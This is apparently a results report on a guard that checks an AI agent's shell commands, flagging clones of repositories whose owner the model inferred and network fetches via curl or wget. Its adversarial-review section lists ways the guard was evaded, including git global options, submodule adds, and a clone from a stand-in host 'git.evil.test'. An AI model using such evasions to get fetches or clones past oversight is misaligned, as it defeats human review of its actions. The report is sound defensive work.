# S30-28 — cloning a repository the model inferred, and the shell as a fetch. Results

*2026-10-05. Pre-registered in [`PREREGISTRATION.md`](PREREGISTRATION.md) (commit `41593500`) before
either rule existed. Run: `uv run python bench/shell_fetch/run.py --homes <~/hb-homes>`; readings in
[`results/readings.txt`](results/readings.txt), every row in [`results/summary.json`](results/summary.json).
Deterministic, no model, US$ 0.*

## Verdict

**Every prediction held, to the row, and every registered corpus criterion is met.** The guard still
ships **off**, for the reason registered before the run: the trace replay has no positive class, so
nothing here measures how often a real session clones or curls, and therefore how many questions
the narrowing armed by a clone costs afterwards.

| | predicted | measured |
|---|---|---|
| clone, inferred, asked | 8/8 | **8/8** |
| clone, named, asked (false-REVIEW) | 0/10 | **0/10** |
| clone, local, asked (false-REVIEW) | 0/4 | **0/4** |
| shell fetch, tainted | 7/7 | **7/7** |
| shell not-fetch, tainted (false taint) | 1/9 | **1/9** |
| trace replay, clone asked | 0 | **0 / 8,964 exec calls** |
| trace replay, shell fetch tainted | 0 | **0 / 8,964 exec calls** |

Control (guard off): every clone row ALLOW (22/22) and no shell row taints the run (0/16) — the
study's reading of `ff1f983e`.

## Readings

- **Clone review.** Every syntax in the corpus parses to its `owner/repo`: https with and without
  `.git`, `--depth`, `-b <branch>`, a destination directory, `git@host:`, `ssh://`, `gh repo clone`,
  two clones joined by `&&`. A name counts as given in any of the spellings a user writes (`owner/
  repo`, `host/owner/repo`, the URL with or without `.git` or a trailing slash, a GitLab nested
  group) and only bounded: `r/rich` inside `vendor/rich` is not a name (a test holds it). The
  `inferred` class is asked whether the inferred owner is right or hallucinated — the rule cannot
  tell, and the card shows the owner so a person can.
- **The shell as a fetch.** The one false taint is the registered one: `grep -rn "wget
  https://x.test" docs/` — a URL after the word `wget` inside a grep pattern. It costs a tainted run
  (narrowing armed), never a refusal by itself.
- **Trace replay: 8,964 exec-tool calls across 2,217 runs, nothing fired.** As registered, this
  bounds false alarms on commands that are none of the shapes (Wilson 95% upper bound ≈ 0.04% per
  call) and says nothing about the positive class: the census before the run found no `git clone`,
  `curl` or `wget` in those traces.
- **The pip card line** is held by tests with a stubbed PyPI (exists with first-release date / does
  not exist / unknown when unreachable; nothing looked up while the guard is off). It changes no
  verdict and has no false-alarm rate.

## What would move the decision

Traces of real sessions that clone or curl, with a ledger attached: how often the clone is of a
repository the user named (no question), how often it is inferred (a question), and how many
narrowing questions the taint from a clone causes later in the same run.

## Added after the readings: what an adversarial review found

Written after the run. The corpus and the numbers above are unchanged — rerunning the corpus after
these fixes reproduces every reading to the row — and the misses are recorded here rather than added
to the corpus, because rows written after the readings would be rows written to pass.

- **Clone syntaxes the corpus did not have.** `git -c http.sslVerify=false clone URL`, `git -C /tmp
  clone URL` and `git submodule add URL` were neither asked about nor recorded as fetches: git's
  global options take a value, and the parser allowed only words starting with `-` before `clone`.
  Fixed; held by the test parametrisation, not by the corpus.
- **A bare `owner/repo` named every host.** "Clone psf/requests" let `git clone
  https://git.evil.test/psf/requests` through, so whoever chose the host kept the user's words. The
  bare form now names the repository on github.com only; on any other host the user has to have
  written the host. No corpus row moved: every `named` row off GitHub already spells its host.
- **The pip card told PyPI more than the install would.** The lookup runs when the question is
  asked, before the answer, so a refused install still sent its name; and with `-i`/`--index-url`
  or `PIP_INDEX_URL` a private package's name went to public PyPI and the card said "does not exist"
  of a package that exists on the configured index. Now: no lookup, and a "not checked" line, when
  the command or the environment names another index; no lookup where nobody reads the card
  (`observe`, an `allow`/`deny` owner, an unattended surface); value-taking options (`--trusted-host`,
  `--timeout`, ...) are no longer read as packages; "unreachable" is remembered for a minute. An index
  configured in `pip.conf` or `uv.toml` is still not detected — said in the module docstring.
